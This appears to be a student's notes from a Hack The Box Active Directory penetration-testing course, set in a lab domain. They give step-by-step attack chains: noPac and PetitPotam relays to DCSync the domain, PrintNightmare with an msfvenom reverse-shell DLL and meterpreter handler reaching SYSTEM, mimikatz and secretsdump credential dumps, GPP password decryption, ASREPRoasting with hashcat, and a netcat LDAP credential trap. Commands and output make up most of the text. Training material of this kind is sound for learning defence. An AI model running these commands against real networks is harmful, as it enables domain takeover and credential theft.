--- ---

<h2>Privileged Access</h2>

Context
Once we gain a foothold in the domain, our goal shifts to advancing our position further by moving laterally or vertically to obtain access to other hosts, and eventually achieve domain compromise or some other goal, depending on the aim of the assessment. To achieve this, there are several ways we can move laterally. Typically, if we take over an account with local admin rights over a host, or set of hosts, we can perform a Pass-the-Hash attack to authenticate via the SMB protocol.

But what if we don't yet have local admin rights on any hosts in the domain?

There are several other ways we can move around a Windows domain:

1. Remote Desktop Protocol (RDP) - is a remote access/management protocol that gives us GUI access to a target host
2. PowerShell Remoting - also referred to as PSRemoting or Windows Remote Management (WinRM) access, is a remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell
3. MSSQL Server - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. This access can be used to run operating system commands in the context of the SQL Server service account through various methods

Enumerate Access via Bloodhound
![[Pasted image 20230103181311.png]]

Enumerating the Remote Desktop Users Group
```
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName
"Remote Desktop Users"
```

![[Pasted image 20230103181436.png]]
- From the information above, we can see that all Domain Users (meaning all users in the domain) can RDP to this host.
- Common to see on jump hosts.

Enumerating the Remote Management Users Group
```
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName
"Remote Management Users"
```
- Custom query to enumerate via Bloodhound:
	```
	MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-
	[:CanPSRemote*1..]->(c:Computer) RETURN p2
	```

Establishing WinRM Session from Windows
```
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential
("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
```

Establishing WinRM Session from Linux
```
evil-winrm -i 10.129.201.234 -u forend
```


SQL Server Admin
More often than not, we will encounter SQL servers in the environments we face. It is
common to find user and service accounts set up with sysadmin privileges on a given SQL
server instance. Obtain credentials in the following ways:
- Kerberoasting
- LLMNR/NBT-NS Response Spoofing
- Password Spraying
- Snaffler to find web.config files

Custom Query to Find SQL Admins in Bloodhound
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-
[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

In the lab damundsen has SQLAdmin rights
- Use ACL rights to authenticate with wley user
- Change password for the damundsen user
- Authenicate with the target using PowerUpSQL
	- Command Cheat Sheet
- Log in as damundsen

1. Hunt for SQL Server Instances with PowerUpSQL
```
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb> Import-Module
.\PowerUpSQL.ps1
PS C:\htb> Get-SQLInstanceDomain
```

2. Run a simple query against the SQL Server
```
PS C:\htb> Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username
"inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```



Authenticate with Linux Through mssqlclient.py
```
TeneBrae93@htb[/htb]$ mssqlclient.py
INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```
	- Once connected, type "help" to see which commands are available

We could then choose enable_xp_cmdshell to enable the xp_cmdshell stored procedure which allows for one to execute operating system commands via the database if the account in question has the proper access rights.
SQL>
enable_xp_cmdshell
	- Run commands in the format of xp_cmdshell `<command>`

Enumerating Rights on System using xp_cmdshell
![[Pasted image 20230103183620.png]]
- With SeImpersonatePrivilege we could use JuicyPotato, PrintSpoofer, or RoguePotato to escalate to SYSTEM level privileges, depending on the target host, and use this access to continue toward our goal.

---

<h2>Bleeding Edge Vulnerabilities</h2>

NoPac (SamAccountName Spoofing)
A great example of an emerging threat is the Sam_The_Admin vulnerability, also called noPac
or referred to as SamAccountName Spoofing released at the end of 2021. This vulnerability
encompasses two CVEs 2021-42278 and 2021-42287, allowing for intra-domain privilege
escalation from any standard domain user to Domain Admin level access in one single
command.
- Takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller
- By default, authenticated users can add up to ten computers to a domain.
- Add a computer change the name to that of a Domain Controller
- Request a Kerberos ticket causing the service to issue a ticket under the DC's name

Tool to perform the attack:
Ridter/noPac: Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user (github.com)

Pre-requisites:
![[Pasted image 20230103183818.png]]

1. Scan for NoPac to see if the network is vulnerable
```
TeneBrae93@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
- "Current ms-DS-MachineAccountQuota = 10" -- this means it's vulnerable

2. Run NoPac & Getting a Shell
```
TeneBrae93@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
- Semi-interactive shell with smbexec.py
- Need to use exact paths instead of navigating the directory structure using cd

3. Confirming the Location of Saved Tickets
![[Pasted image 20230103184032.png]]

4. Using NoPac to DCSync the Built-in Administrator Account
```
TeneBrae93@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```


PrintNightmare
PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and CVE-2021-1675) found in the Print Spooler service that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution.

1. Clone the Exploit
```
TeneBrae93@htb[/htb]$ git clone https://github.com/cube0x0/CVE-
2021-1675.git
```

2. Install cube0x0's Version of Impacket
```
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

3. Use rpcdump.py to see if "Print System Asynchronous Protocol" and "Print System Remote
```
Protocol" are exposed on the target
TeneBrae93@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-
RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote
Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol
```

4. Generate a DLL Paylod with MSFVenom
```
TeneBrae93@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp
LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll
```

5. Host the payload in an SMB Share from attack machine
```
TeneBrae93@htb[/htb]$ sudo smbserver.py -smb2support CompData
/path/to/backupscript.dll
```

6. Configure and Start a MSF multi/handler
```
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD
windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.129.202.111
LHOST => 10.3.88.114
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 10.129.202.111:8080
```

7. Exploit the target!
```
TeneBrae93@htb[/htb]$ sudo python3 CVE-2021-1675.py
inlanefreight.local/<username>:<password>@172.16.5.5
'\\10.129.202.111\CompData\backupscript.dll'
- If all goes well after running the exploit, the target will access the share and execute the
payload. The payload will then call back to our multi handler giving us an elevated SYSTEMshell.
```

8. Getting System Shell!
```
[*] Sending stage (200262 bytes) to 172.16.5.5
[*] Meterpreter session 1 opened (10.129.202.111:8080 -> 172.16.5.5:58048 ) at 2022-
03-29 13:06:20 -0400
(Meterpreter 1)(C:\Windows\system32) > shell
Process 5912 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Windows\system32>whoami
whoami
nt authority\system
```



PetitPotam (MS-EFSRPC)
PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol (LSARPC) by abusing Microsoft’s Encrypting File System Remote Protocol (MS- EFSRPC). This technique allows an unauthenticated attacker to take over a Windows domain where Active Directory Certificate Services (AD CS) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as Rubeus or gettgtpkinit.py from PKINITtools to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.

1. Start ntlmrelayx.py
```
TeneBrae93@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

2. Running PetitPotam.py from a second terminal window
```
TeneBrae93@htb[/htb]$ python3 PetitPotam.py
```
172.16.5.225 172.16.5.5
- 172.16.5.225 ---> Attack IP
- 172.16.5.5      ---> DC IP

3. Back in the ntlmrelayx.py window, you should see the base64 encoded cert for the DC
![[Pasted image 20230103185401.png]]

4. Request a TGT Using gettgtpkinit.py
```
TeneBrae93@htb[/htb]$ python3 /opt/PKINITtools/gettgtpkinit.py
INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <full_base64_string>
- TGT is saved to dc01.ccache to be used in the next step
```

5. Set the KRB5CCNAME Environment Variable
```
TeneBrae93@htb[/htb]$ export
KRB5CCNAME=dc01.ccache
```

6. Use Domain Controller TGT to DCSync
```
TeneBrae93@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-
pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

7. Confirm Admin Access to the Domain Controller
```
TeneBrae93@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H
88ad09182de639ccc6579eb0849751cf
```

8. (Alternative) Submitting a TGS Request for Ourselves Using getnthash.py
```
TeneBrae93@htb[/htb]$ python /opt/PKINITtools/getnthash.py -key
70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```

9. (Alternative) Using Domain Controller NTLM Hash to DCSync
```
TeneBrae93@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY -EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```



On Windows (after step 3 of obtaining base64 certificate via ntlmrelayx.py)

1. Request TGT and Perform PTT with DC01$ Machine Account
```
PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$
/certificate:<full_base64_string>
```

2. Use klist to confirm ticket is in memory
![[Pasted image 20230103185713.png]]

3. Perform DCSync with Mimikatz
```
PS C:\Tools\mimikatz\x64>
.\mimikatz.exe
lsadump::dcsync
/user:inlanefreight\krbtgt
```

---

<h2>Miscellaneous Misconfigurations</h2>

For the portions of this section that require interaction from a Linux host, you can open a PowerShell console on MS01 and SSH to 172.16.5.225 with the credentials htb-student:HTB_@cademy_stdnt!.

Exchange Related Group Membership
- A default installation of Microsoft Exchange within an AD environment (with no split-administration model) opens up many attack vectors, as Exchange is often granted considerable privileges within the domain (via users, groups, and ACLs).
- The group Exchange Windows Permissions is not listed as a protected group, but members are granted the ability to write a DACL to the domain object.
- This can be leveraged to give a user DCSync privileges. An attacker can add accounts to this group by leveraging a DACL misconfiguration (possible) or by leveraging a compromised account that is a member of the Account Operators group.
- Techniques available here -- https://github.com/gdedrouas/Exchange-AD-Privesc


PrivExchange
- The PrivExchange attack results from a flaw in the Exchange Server PushSubscription feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.
- This flaw can be leveraged to relay to LDAP and dump the domain NTDS database.



Printer Bug
- The Printer Bug is a flaw in the MS-RPRN protocol (Print System Remote Protocol).
- The spooler service runs as SYSTEM and is installed by default in Windows servers running Desktop Experience. This attack can be leveraged to relay to LDAP and grant your attacker account DCSync privileges to retrieve all password hashes from AD.
- How to check:

1. Download this tool: https://github.com/cube0x0/Security-Assessment

2. Import the module and run the command to check
![[Pasted image 20230103190933.png]]



MS14-068
- This was a flaw in the Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin.
- The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be leveraged to create a fake PAC, presenting a user as a member of the Domain Administrators or other privileged group.
- Exploited by the following:
	- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek
	- Impacket toolkit



Sniffing LDAP Credentials
- Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with weak or default passwords.
- Sometimes, these credentials can be viewed in cleartext.
- Other times, the application has a test connection function that we can use to gather credentials by changing the LDAP IP address to that of our attack host and setting up a netcat listener on LDAP port 389.
- When the device attempts to test the LDAP connection, it will send the credentials to our machine,often in cleartext.



Enumerating DNS Records
- We can use a tool such as adidnsdump to enumerate all DNS records in a domain using a valid domain user account.

1. Running the tool:
```
TeneBrae93@htb[/htb]$ adidnsdump -u inlanefreight\\forend
ldap://172.16.5.5
Password:
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```

2. Viewing Contents of records.csv File
```
TeneBrae93@htb[/htb]$ head records.csv
type,name,value
?,LOGISTICS,?
AAAA,ForestDnsZones,dead:beef::7442:c49d:e
1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:
e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29
```
- Logistics is "unknown"

3. Using -r Option to Resolve Unknown Records
```
TeneBrae93@htb[/htb]$ adidnsdump -u inlanefreight\\forend
ldap://172.16.5.5 -r
Password:
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```

4. Find the Hidden Records in the records.csv File
```
TeneBrae93@htb[/htb]$ head records.csv
type,name,value
A,LOGISTICS,172.16.5.240
AAAA,ForestDnsZones,dead:beef::7442:c49d:e
1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:
e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29
```



PASSWD_NOTREQD Field
- If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain).
- It is worth enumerating accounts with this flag set and testing each to see if no password is required

1. Check for PASSWD_NOTREQD Setting using Get-DomainUser
```
PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object
samaccountname,useraccountcontrol
```



Credentials in SMB Shares and SYSVOL Scripts
The SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. It is worth digging around this directory to hunt for passwords stored in scripts. Sometimes we will find very old scripts containing since disabled accounts or old passwords, but from time to time, we will strike gold, so we should always dig through this directory.

Example:
![[Pasted image 20230103191411.png]]

![[Pasted image 20230103191426.png]]



Group Policy Preferences (GPP) Passwords
When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:

• Map drives (drives.xml)
• Create local users
• Create printer config files (printers.xml)• Creating and updating services (services.xml)
• Creating scheduled tasks (scheduledtasks.xml)
• Changing local admin passwords.

• The cpassword attribute value is AES-256 bit encrypted, but Microsoft published the AES private key on MSDN, which can be used to decrypt the password.
• Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.

Example:
![[Pasted image 20230103191546.png]]

Decrypting the Password with gpp-decrypt
![[Pasted image 20230103191605.png]]

Tool to find GPP Passwords:
https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1

Locating & Retrieving GPP Passwords with CrackMapExec
```
TeneBrae93@htb[/htb]$ crackmapexec smb -L | grep gpp
[*] gpp_autologin
Searches the domain controller for registry.xml to find autologon information
and returns the username and password.
[*] gpp_password
Retrieves the plaintext password and other information for accounts pushed
through Group Policy Preferences.
```

• It is also possible to find passwords in files such as Registry.xml when autologon is configured via Group Policy.

• Hunt for this using gpp_autologin module of cme
```
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M
gpp_autologin
```



ASREPRoasting
• It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled.
• Many vendor installation guides specify that their service account be configured in this way.
• If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.
• The attack itself can be performed with the Rubeus toolkit and other tools to obtain the ticket for the target account
• This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth.

1. Enumerate for "DONT_REQ_PREAUTH Value using Get-DomainUser
```
PS C:\htb> Get-DomainUser -PreauthNotRequired | select
samaccountname,userprincipalname,useraccountcontrol | fl
```

2. Use Rubeus to retrieve the hash for hashcat
```
PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap
/format:hashcat
```

3. Crack with hashcat
```
TeneBrae93@htb[/htb]$ hashcat -m 18200 ilfreight_asrep
/usr/share/wordlists/rockyou.txt
```



Using Kerbrute
- When performing user enumeration with Kerbrute, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.

1. Retrieving the AS-REP Using Kerbrute
```
TeneBrae93@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc
172.16.5.5 /opt/jsmith.txt
```



Hunting for Users with Kerberoast Pre-auth Not Required Using GetNPUsers.py
- With a list of valid users, we can use Get-NPUsers.py from the Impacket toolkit to hunt for all users with Kerberoast pre-authentication not required.
- The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found.
- We can also feed a wordlist such as jsmith.txt into the tool, it will throw errors for users that do not exist, but if it finds any valid ones without Kerberos pre-authentication, then it can be a nice way to obtain a foothold or further our access, depending on where we are in the course of our assessment.
```
TeneBrae93@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -
usersfile valid_ad_users
```



Group Policy Object (GPO) Abuse
- If we can gain rights over a Group Policy Object via an ACL misconfiguration, we could leverage this for lateral movement, privilege escalation, and even domain compromise and as a persistence mechanism within the domain.
- GPO misconfigurations can be abused to perform the following attacks:
	- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
	- Adding a local admin user to one or more hosts
	- Creating an immediate scheduled task to perform any number of actions

1. Enumerate GPO Names with PowerView
```
PS C:\htb> Get-DomainGPO |select displayname
```
- This can be helpful for us to begin to see what types of security measures are in place (such as
denying cmd.exe access and a separate password policy for service accounts).

2. Enumerating GPO Names with a Built-In Cmdlet
```
PS C:\htb> Get-GPO -All | Select
DisplayName
```

3. Enumerate Domain user GPO Rights
```
PS C:\htb> $sid=Convert-NameToSid "Domain Users"
PS C:\htb> Get-DomainGPO | Get-ObjectAcl |
?{$_.SecurityIdentifier -eq $sid}
```

4. Convert GPO GUIDs we fine to a name
```
PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-
83F4097AF532
```

5. We can also enumerate this information with Bloodhound
![[Pasted image 20230103192411.png]]

![[Pasted image 20230103192428.png]]

6. Take advantage of the misconfiguration
	a. Use a tool such as SharpGPOAbuse - https://github.com/FSecureLABS/SharpGPOAbuse
		i. Adding a user we control to local admins group
		ii. Creating a task that gives us a reverse shell
		iii. Configure a malicious computer startup script